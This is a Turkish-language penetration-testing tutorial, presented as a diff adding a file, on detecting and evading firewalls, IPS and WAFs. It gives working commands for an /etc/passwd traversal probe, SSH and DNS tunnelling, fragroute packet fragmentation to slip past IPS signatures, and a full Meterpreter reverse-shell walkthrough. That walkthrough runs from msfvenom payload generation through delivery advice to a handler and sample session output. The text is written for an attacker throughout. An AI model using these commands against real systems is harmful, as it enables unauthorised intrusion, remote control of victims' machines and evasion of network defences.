@@ -1,0 +1,117 @@
+Firewall, WAF, Saldırı Engelleme Sistemi Keşif Çalışması 
+Öncelikle, kullandığınız araçların güncel sürümlerini indirdiğinizden emin olun. Hping, telnet, Wafw00f ve Ipsfinder.py gibi araçlar sürekli olarak yeni özellikler ve güvenlik güncellemeleri alıyor. Bu araçları Kali Linux gibi bir dağıtımda kullanıyorsanız, apt komutu ile güncelleyebilirsiniz. Örneğin:
+sudo apt update
+sudo apt install hping3 telnet wafw00f
+Ardından, hedef sistemin IP adresini veya alan adını belirlediğinizden emin olun. Bu bilgiyi elde etmek için ping, nslookup, dig veya traceroute gibi araçları kullanabilirsiniz. Örneğin:
+ping www.example.com
+nslookup www.example.com
+dig www.example.com
+traceroute www.example.com
+Bu araçlar size hedef sistemin IP adresini ve ağ yolunu gösterecektir. Bu bilgileri not edin, çünkü daha sonra kullanacaksınız.
+Şimdi, hedef sistemin önünde bir güvenlik duvarı olup olmadığını tespit etmek için hping aracını kullanabilirsiniz. Hping, TCP, UDP veya ICMP paketleri göndermenize ve almanıza olanak tanır. Güvenlik duvarı olmayan bir sistemde, açık bir porta SYN paketi gönderdiğinizde SYN/ACK cevabı alırsınız. Kapalı bir porta gönderdiğinizde ise RST/ACK cevabı alırsınız. Güvenlik duvarı olan bir sistemde ise, genellikle hiçbir cevap alamazsınız veya ICMP tip 3 kod 13 (Yönetimsel Yasaklama) gibi bir hata mesajı alırsınız. Örneğin:
+hping3 -S -p 80 www.example.com
+hping3 -S -p 81 www.example.com
+Bu komutlar, www.example.com'un 80 ve 81 numaralı portlarına SYN paketleri gönderir. Eğer 80 numaralı port açıksa, SYN/ACK cevabı alırsınız. Eğer 81 numaralı port kapalıysa, RST/ACK cevabını alırsınız veya hiçbir cevap almazsınız. Eğer hiçbir cevap almazsanız, bu bir güvenlik duvarının varlığını gösterebilir.
+Bazı güvenlik duvarları, SYN Proxy özelliği ile SYN paketlerine yanıt verebilir. Bu durumda, gerçek port durumunu anlamak için nmap aracını kullanabilirsiniz. Nmap, port taraması, işletim sistemi tespiti, servis tespiti ve güvenlik açığı tespiti gibi işlevlere sahiptir. Örneğin:
+nmap -sV -p 80,81 www.example.com
+Bu komut, www.example.com'un 80 ve 81 numaralı portlarını tarar ve servis versiyonlarını gösterir. Eğer portlar kapalı veya filtreli ise, bu bir güvenlik duvarının varlığını gösterebilir.
+Bir sonraki adımda, hedef sistemin önünde bir IPS (Saldırı Tespit ve Engelleme Sistemi) olup olmadığını tespit etmek için telnet aracını kullanabilirsiniz. Telnet, uzak bir sunucuya bağlanmanıza ve komut göndermenize olanak tanır. IPS'ler, web uygulamalarına yönelik saldırıları tespit etmek ve engellemek için imza tabanlı veya davranış tabanlı yöntemler kullanır. Örneğin, URL'de /etc/passwd, /bin/sh veya cmd.exe gibi dizin veya komut geçişleri (directory/path traversal) saldırılarına karşı hassastırlar. Örneğin:
+telnet www.example.com 80
+GET /../../../../etc/passwd HTTP/1.0
+Bu komutlar, www.example.com'un 80 numaralı portuna bağlanır ve bir HTTP isteği gönderir. Eğer bağlantı aniden kesilirse veya hedef sistemden cevap alamazsanız, bu bir IPS'in varlığını gösterebilir. IPS koruması olmayan bir sistemde, genellikle bir HTTP cevabı alırsınız.
+Bir IPS'in varlığını tespit etmek için tcpdump aracını da kullanabilirsiniz. Tcpdump, ağ trafiğini yakalamanıza ve analiz etmenize olanak tanır. Örneğin:
+tcpdump -i eth0 -ttnn host www.example.com -X
+Bu komut, eth0 arayüzünden www.example.com ile ilgili paketleri yakalar ve ekrana basar. Eğer IPS tarafından engellenen paketleri görürseniz, bu bir IPS'in varlığını gösterebilir.
+Son olarak, hedef sistemin önünde bir WAF (Web Uygulama Güvenlik Duvarı) olup olmadığını tespit etmek için Wafw00f aracını kullanabilirsiniz. Wafw00f, bir web sitesini koruyan WAF ürünlerini tanımlamak ve parmak izi vermek için tasarlanmış bir araçtır. Wafw00f, normal ve potansiyel olarak zararlı HTTP istekleri gönderir ve basit bir mantık kullanarak hangi WAF'in olduğunu çıkarır. Örneğin:
+wafw00f http://www.example.com
+Bu komut, www.example.com web sitesini koruyan bir WAF olup olmadığını ve hangi WAF olduğunu gösterir. Eğer bir WAF tespit edilirse, bu bir WAF'in varlığını gösterebilir.
+Bu adımları takip ederek, hedef sistemin önünde hangi güvenlik cihazlarının olduğunu keşfedebilirsiniz. Bu bilgileri, güvenlik testi veya saldırı senaryoları için kullanabilirsiniz. 
+SSH Tüneli Kullanarak Firewall/IPS/CF Atlatma Çalışması
+SSH tüneli, bir ağ üzerindeki iki cihaz arasında şifreli bir bağlantı kurarak veri akışını güvenli bir şekilde sağlayan bir yöntemdir. SSH tüneli kullanarak, güvenlik duvarı, IPS veya içerik filtresi gibi kısıtlamaları olan bir ağdan dışarıya erişim sağlayabilirsiniz. Bu sayede, istediğiniz web sitelerine, uygulamalara veya servislere bağlanabilirsiniz.
+SSH tüneli kurmak için, öncelikle bir SSH sunucusu kurulu olan ve dışarıya erişimi olan bir cihaza sahip olmanız gerekir. Bu cihaz, sizin kendi bilgisayarınız, bir VPS, bir arkadaşınızın bilgisayarı veya başka bir cihaz olabilir. SSH sunucusu kurulu olan cihazın IP adresini ve SSH portunu bilmelisiniz. Ayrıca, SSH sunucusuna bağlanmak için bir kullanıcı adı ve şifre veya bir SSH anahtarı da gereklidir.
+SSH tüneli kurmak için, birçok farklı araç veya yöntem kullanabilirsiniz. Bunlardan biri, sshuttle adlı bir Python programıdır. sshuttle, SSH sunucusuna bağlanarak, tüm internet trafiğinizi SSH tüneli üzerinden yönlendirmenizi sağlar. Böylece, ağınızdaki güvenlik cihazlarını atlatmış olursunuz.
+sshuttle kullanmak için, öncelikle programı indirmeniz gerekir. Bunu yapmak için, aşağıdaki komutu kullanabilirsiniz:
+git clone https://github.com/apenwarr/sshuttle.git
+Daha sonra, sshuttle dizinine girerek, programı çalıştırabilirsiniz. Programı çalıştırmak için, aşağıdaki komutu kullanabilirsiniz:
+cd sshuttle
+./sshuttle -r kullanıcı_adı@SSH_sunucu_IP_adresi:SSH_portu 0.0.0.0/0 -vv --dns
+Bu komutta, kullanıcı_adı, SSH sunucusuna bağlanmak için kullandığınız kullanıcı adı, SSH_sunucu_IP_adresi, SSH sunucusunun IP adresi, SSH_portu, SSH sunucusunun dinlediği port numarasıdır. 0.0.0.0/0, tüm internet trafiğinin SSH tüneli üzerinden yönlendirileceğini belirtir. -vv, programın ayrıntılı çıktı vermesini sağlar. --dns, DNS sorgularının da SSH tüneli üzerinden yönlendirilmesini sağlar.
+Bu komutu çalıştırdığınızda, SSH sunucusunun şifresini veya anahtarını girmeniz istenebilir. Girdikten sonra, SSH tüneli kurulmuş olacaktır. Artık, ağınızdaki güvenlik cihazlarını atlatarak, istediğiniz web sitelerine, uygulamalara veya servislere erişebilirsiniz.
+SSH tüneli kurduğunuzda, dışarıdan görünen IP adresiniz, SSH sunucusunun IP adresi olacaktır. Bunu test etmek için, whatismyip.com gibi bir web sitesine girebilir ve IP adresinizi kontrol edebilirsiniz.
+SSH tüneli kullanarak güvenlik cihazlarını atlatma çalışması, bu şekilde yapılabilir. 
+DNS Tünelleme Kullanarak Firewall/IPS/CF Atlatma Çalışması
+DNS tünelleme, DNS protokolü üzerinden veri göndermek için kullanılan bir yöntemdir. DNS protokolü, veri transferi için tasarlanmamıştır. Bu nedenle, insanlar bunu göz ardı etme eğilimindedir ve bu da birçok saldırıda etkili bir araç haline gelmiştir. DNS tünelleme, internet erişimi engellenmiş veya kısıtlanmış bir kullanıcının, DNS trafiğinin izin verildiği bir ağdan internete ulaşmasını sağlayabilir. Ayrıca, bir saldırganın ağ güvenlik cihazlarını (Firewall, DLP cihazları...) atlayarak bir kuruluşun ağı üzerinde doğrudan ve izlenmeyen bir iletişim kanalı kurmasını da mümkün kılar. DNS tünelleme, SSH, HTTP, FTP gibi farklı protokolleri DNS ile tünelleme yoluyla gerçekleştirilebilir.
+DNS tünelleme yapmak için, aşağıdaki ön gereksinimleri karşılamalısınız:
+- DNS isteklerinize yanıt alabildiğinizi doğrulamalısınız. Örneğin; nslookup google.com.tr komutu ile Google IP adreslerini öğrenebiliyorsanız, DNS isteklerinize yanıt veriliyordur.
+- İnternet dünyasında sizin kontrolünüzde olan bir sunucu. Administrator veya root yetkilerine sahip olmalısınız. UDP 53 portu farklı bir uygulama tarafından kullanılmıyor olmalı ve erişim problemi yaşanmamalıdır.
+- Kullandığınız işletim sistemine göre DNS tünelleme yazılımı. Bu yazılımların çoğu Java tabanlıdır, bu yüzden mutlaka Java kurulu olmalıdır. DNS tünelleme yazılımları arasında DNScat2, Iodine, TCP-over-DNS gibi popüler seçenekler vardır.
+DNS tünelleme yapmak için, aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Bir alan adına ve bu alan adından sorumlu DNS sunucuya ihtiyacınız vardır. Bu örnekte, tunnel.example.com alan adını ve dns.example.com DNS sunucusunu kullanacağız. Bu alan adı ve DNS sunucusu sizin kontrolünüzde olmalıdır. DNS sunucusu üzerinde, tunnel.example.com alan adı için A kaydı ve example.com alan adı için NS kaydı oluşturmalısınız. Örneğin:
+tunnel.example.com. IN A 192.168.0.113
+example.com. IN NS dns.example.com.
+Bu kayıtlar, DNS isteklerinin tunnel.example.com alan adından sorumlu DNS sunucusuna yönlendirilmesini sağlar.
+2. Adım: DNS tünelleme yazılımınızı DNS sunucunuzda çalıştırmalısınız. Bu örnekte, TCP-over-DNS yazılımını kullanacağız. TCP-over-DNS, multi platform çalışmaktadır (Windows, Linux, *BSD). Bu örnekte, DNS sunucu FreeBSD, istemci ise Windows 10 işletim sisteminde kurulmuştur. TCP-over-DNS yazılımını indirdikten sonra, DNS sunucunuzda aşağıdaki komutu çalıştırarak TCP-over-DNS sunucusunu başlatabilirsiniz:
+java -jar tcpoverdns.jar server tunnel.example.com
+Bu komut, TCP-over-DNS sunucusunu tunnel.example.com alan adı için çalıştırır. TCP-over-DNS sunucusu, gelen trafiği port 443 (SSH servisine) yönlendirecektir.
+3. Adım: DNS tünelleme yazılımınızı istemci bilgisayarınızda çalıştırmalısınız. TCP-over-DNS yazılımını indirdikten sonra, istemci bilgisayarınızda client-example.bat dosyasını düzenleyerek DOMAIN değerini bu iş için oluşturduğunuz alan adı ile değiştirmelisiniz. Örneğin:
+set DOMAIN=tunnel.example.com
+client-example.bat dosyasını çalıştırdığınızda, tünel için 127.0.0.1:8080 portu dinlemeye alınacaktır. TCP-over-DNS istemcisi, yerel bilgisayarınızda 8080 portunu dinlemeye açtı ve bu porta yapılan bağlantıları tunnel.example.com makinasının 443 (SSH) portuna iletecektir.
+4. Adım: Test için, Putty aracı ile 127.0.0.1:8080 portuna bağlantı isteği başlattığınızda, tunnel.example.com adresinin 443 portuna erişim kurulacaktır. SSH trafiği firewall tarafından engellenmiş olsa da, DNS paketleri ile SSH trafiği internete kaçırılmış olacaktır.
+Bu yöntem ile birçok yerde bulunan hotspot sistemlerini de atlatabilmek mümkündür. Ancak, DNS tünelleme yaparken dikkatli olmalısınız. Çünkü, DNS tünelleme, ağ güvenliğini ihlal eden ve yasal sorumluluk doğurabilecek bir eylemdir. Ayrıca, DNS tünelleme, veri transferi için çok yavaş ve verimsiz bir yöntemdir. Bu nedenle, DNS tünelleme yapmadan önce, alternatif yöntemleri değerlendirmenizi ve ağ kurallarına uymanızı tavsiye ederim.
+Ultrasurf ve TOR Kullanarak İçerik Filtreleme Sistemlerini Atlatma
+Ultrasurf ve TOR, internet sansürünü aşmak için kullanılan iki popüler araçtır. Ultrasurf, kullanıcıların engellenmiş web sitelerine erişmesini sağlayan bir proxy yazılımıdır. TOR ise, kullanıcıların anonim olarak internete bağlanmasını sağlayan bir ağdır. Bu iki aracın kullanımı ve içerik filtreleme sistemlerini atlatma yöntemleri şöyle yapılabilir: 
+Kullanılan Araçlar:
+- TOR
+- Ultrasurf
+Adımlar:
+1. Adım: Ultrasurf'ü indirin ve çalıştırın. Ultrasurf, otomatik olarak bir proxy sunucusuna bağlanacaktır. Bu sayede, firewall'un engellediği portlara erişebileceksiniz. Ultrasurf'ün ayarlarını değiştirmek isterseniz, programın sağ alt köşesindeki simgeye tıklayın. Burada, proxy sunucusunu, bağlantı noktasını, güvenlik seviyesini ve diğer seçenekleri ayarlayabilirsiniz. Ultrasurf'ü kapatmak için, programın sağ üst köşesindeki kırmızı X simgesine tıklayın.
+2. Adım: TOR Browser'ı indirin ve kurun. TOR Browser, TOR ağına bağlanmanızı sağlayan bir web tarayıcısıdır. TOR ağı, kullanıcıların internet trafiğini rastgele IP adresleri üzerinden yönlendiren bir sistemdir. Bu sayede, içerik filtreleme cihazlarını kolaylıkla atlayabilirsiniz. TOR Browser'ı açtığınızda, otomatik olarak TOR ağına bağlanacaktır. TOR Browser'ın ayarlarını değiştirmek isterseniz, tarayıcının sol üst köşesindeki soğan simgesine tıklayın. Burada, güvenlik seviyesini, köprüleri, ağ ayarlarını ve diğer seçenekleri ayarlayabilirsiniz. TOR Browser'ı kapatmak için, tarayıcının sağ üst köşesindeki kırmızı X simgesine tıklayın.
+Tersine Kanal Açma Yöntemleri
+Tersine kanal açma yöntemleri, hedef sistemin saldırganın kontrol ettiği bir sisteme bağlanmasını sağlayan bir tür kabuk yöntemleridir. Bu yöntemler, hedef sistemin arkasında bir güvenlik duvarı veya NAT gibi bir engel olması durumunda veya hedef sistemin gelen bağlantıları engellemesi durumunda kullanışlıdır. Tersine kanal açma yöntemleri, saldırganın bir dinleyici (listener) programı çalıştırarak hedef sistemin bağlanacağı bir IP adresi ve port numarası belirlemesini gerektirir. Hedef sistemde çalıştırılan bir yük (payload), saldırganın belirlediği IP adresine ve porta bağlanarak bir kabuk (shell) oturumu başlatır. Bu kabuk, saldırganın hedef sistemi uzaktan kontrol etmesini sağlar.
+Metasploit, tersine kanal açma yöntemleri için çeşitli yükler sunar. Bu yükler, farklı protokoller (TCP, HTTP, HTTPS, DNS, ICMP vb.) ve farklı platformlar (Windows, Linux, Java, PHP vb.) için tasarlanmıştır. Bu yüklerin bazıları, saldırganın hedef sisteme daha fazla işlevsellik sağlayan Meterpreter adlı bir kabuk sunar. Meterpreter, saldırganın hedef sistemin dosya sistemi, kayıt defteri, işlemler, ağ, ekran, kamera, mikrofon, klavye, fare vb. ile etkileşim kurmasını sağlar. Ayrıca, saldırganın hedef sisteme daha fazla yük enjekte etmesine veya hedef sistemin diğer sistemlere saldırmasına da olanak tanır.
+Tersine kanal açma yöntemleri kullanmak için, saldırganın öncelikle bir yük oluşturması gerekir. Bu yük, hedef sistemin bağlanacağı IP adresi ve port numarası gibi bazı seçenekleri içerir. Bu seçenekler, msfvenom gibi bir araç kullanılarak veya Metasploit konsolunda set komutu kullanılarak ayarlanabilir. Yük oluşturulduktan sonra, saldırganın bunu hedef sisteme ulaştırması gerekir. Bu, bir web sunucusuna yüklemek, bir e-posta eki olarak göndermek, bir USB bellek ile taşımak, bir zafiyet kullanarak enjekte etmek vb. gibi çeşitli yollarla yapılabilir. Yük, hedef sistemde çalıştırıldığında, saldırganın belirlediği IP adresine ve porta bağlanır.
+Saldırganın ayrıca, hedef sistemden gelen bağlantıları kabul etmek için bir dinleyici programı çalıştırması gerekir. Bu, Metasploit konsolunda exploit -j -z komutu kullanılarak veya msfconsole -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <lhost>; set LPORT <lport>; exploit -j -z\" gibi bir komut satırı kullanılarak yapılabilir. Burada, <payload> saldırganın kullandığı yükün adı, <lhost> saldırganın IP adresi ve <lport> saldırganın port numarasıdır. Dinleyici çalıştırıldığında, hedef sistemden gelen bağlantıları bekler. Bir bağlantı geldiğinde, saldırganın kabuk oturumunu görüntülemesi ve etkileşim kurması için sessions komutunu kullanması gerekir.
+Örneğin, Windows 10 çalıştıran bir hedef sistemde windows/meterpreter/reverse_tcp yükünü kullanarak tersine kanal açma yöntemi uygulamak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Saldırganın sisteminde msfvenom aracını kullanarak bir yürütülebilir yük oluşturun. Bu yük, hedef sistemin saldırganın IP adresine (192.168.1.10) ve port numarasına (4444) bağlanmasını sağlayacaktır.
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
+2. Adım: Oluşturulan yürütülebilir yükü (shell.exe) hedef sisteme ulaştırın. Bu, bir web sunucusuna yükleyerek, bir e-posta eki olarak göndererek, bir USB bellek ile taşıyarak, bir zafiyet kullanarak enjekte ederek vb. yapılabilir.
+3. Adım: Saldırganın sisteminde Metasploit konsolunu açın ve exploit/multi/handler modülünü kullanarak bir dinleyici çalıştırın. Bu dinleyici, hedef sistemden gelen bağlantıları kabul edecek ve saldırgana bir Meterpreter kabuğu sağlayacaktır.
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.10
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit -j -z
+4. Adım: Hedef sistemde yürütülebilir yükü (shell.exe) çalıştırın. Bu, hedef sistemin saldırganın IP adresine ve port numarasına bağlanmasını sağlayacaktır.
+5. Adım: Saldırganın sisteminde Metasploit konsolunda sessions komutunu kullanarak kabuk oturumunu görüntüleyin ve etkileşim kurun. Bu, saldırganın hedef sistemi uzaktan kontrol etmesini sağlayacaktır.
+msf6 exploit(multi/handler) > sessions
+Active sessions
+===============
+  Id  Name  Type                     Information                           Connection
+  --  ----  ----                                   -----------                                     ----------
+  1         meterpreter x86/windows  DESKTOP-123456\user @ DESKTOP-123456  192.168.1.10:4444 -> 192.168.1.20:49158 (192.168.1.20)
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+meterpreter > sysinfo
+Computer        : DESKTOP-123456
+OS              : Windows 10 (10.0 Build 19042).
+Architecture    : x64
+System Language : tr_TR
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: DESKTOP-123456\user
+meterpreter > 
+Bu şekilde, tersine kanal açma yöntemleri kullanarak hedef sistem üzerinde shell alabilir ve uzaktan kontrol edebilirsiniz. 
+Parçalanmış Paketlerle Güvenlik Duvarı Atlatma
+Parçalanmış paketler, bir IP datagramının boyutunun, geçtiği ağın maksimum iletim birimi (MTU) değerinden büyük olduğu durumlarda, daha küçük parçalara bölünmesi sonucu oluşan paketlerdir. Bu paketler, hedefe ulaştıklarında tekrar birleştirilir ve orijinal datagrama dönüşür. Parçalanmış paketler, güvenlik duvarı, saldırı tespit ve engelleme sistemi (IDS/IPS) gibi ağ güvenliği sistemlerinin çalışmasını zorlaştırabilir, çünkü bu sistemler genellikle paketleri başlık bilgilerine göre filtreler veya analiz eder. Eğer bir paket parçalanmışsa, sadece ilk parça paketin başlık bilgilerini taşır, diğer parça paketler ise başlık bilgisi olmadan gönderilir. Bu durumda, güvenlik sistemi sadece ilk parça paketi inceleyebilir ve diğer parça paketleri gözden kaçırabilir. 
+Bu nedenle, parçalanmış paketler kullanarak güvenlik duvarı atlatma yöntemi, saldırganların güvenlik sistemlerini aldatmak için kullandıkları bir tekniktir. Bu teknikte, saldırgan, bir saldırı içeren paketi parçalara ayırarak gönderir ve güvenlik sisteminin saldırıyı tespit etmesini engeller. Örneğin, HTTP trafiğini inceleyen ve /etc/passwd dosyasını yakalamaya karşı bir imza barındıran bir IPS sistemi olsun. Bu sistem, 80 portuna gelen ve giden her trafiği inceleyerek içerisinde /etc/passwd geçen paketleri arar ve bu tanıma uyan paketleri bloklar. Eğer saldırgan, /etc/passwd dosyasını istemek için bir GET talebi gönderirse, IPS sistemi bunu yakalayacaktır. Ancak, saldırgan, fragroute veya benzeri bir araç kullanarak /etc/passwd stringini birden fazla paket olacak şekilde (1. Paket /etc, 2. Paket /passwd) gönderirse, IPS sistemi bunu tespit edemeyecektir.
+Bu yöntemi uygulamak için aşağıdaki adımları takip edebilirsiniz:
+1. Adım: Fragroute aracını indirin ve kurun. Bu araç, paketleri parçalayarak veya değiştirerek güvenlik sistemlerini atlatmak için kullanılan bir araçtır.
+2. Adım: Ngrep aracını indirin ve kurun. Bu araç, ağ trafiğini inceleyerek belirli bir desen arayan bir araçtır. Bu aracı, IPS sistemi gibi kullanarak /etc/passwd dosyasını yakalamaya çalışacağız.
+3. Adım: Hedef sistemden /etc/passwd dosyasını istemek için bir GET talebi oluşturun. Örneğin, GET /etc/passwd HTTP/1.1 şeklinde bir talep olabilir.
+4. Adım: Ngrep aracını çalıştırın ve /etc/passwd desenini aramaya başlayın. Örneğin, ngrep -q -d eth0 /etc/passwd komutunu kullanabilirsiniz. Bu komut, eth0 arayüzünden geçen trafiği inceleyerek /etc/passwd geçen paketleri yakalar.
+5. Adım: GET talebini hedef sisteme gönderin ve ngrep aracının bunu yakaladığını görün. Bu, IPS sisteminin de bu talebi yakalayacağı anlamına gelir.
+6. Adım: Fragroute aracını çalıştırın ve GET talebini parçalayarak göndermek için bir kural oluşturun. Örneğin, fragroute -f frag.conf 192.168.1.100 komutunu kullanabilirsiniz. Bu komut, frag.conf dosyasında belirtilen kurallara göre, 192.168.1.100 IP adresine giden paketleri parçalar. Frag.conf dosyasında, ip_frag 8 kuralını ekleyerek, paketleri 8 byte'lık parçalara ayırabilirsiniz.
+7. Adım: GET talebini tekrar hedef sisteme gönderin ve ngrep aracının bunu yakalayamadığını görün. Bu, IPS sisteminin de bu talebi yakalayamayacağı anlamına gelir. Böylece, parçalanmış paketlerle güvenlik duvarı atlatma yöntemini uygulamış olursunuz.
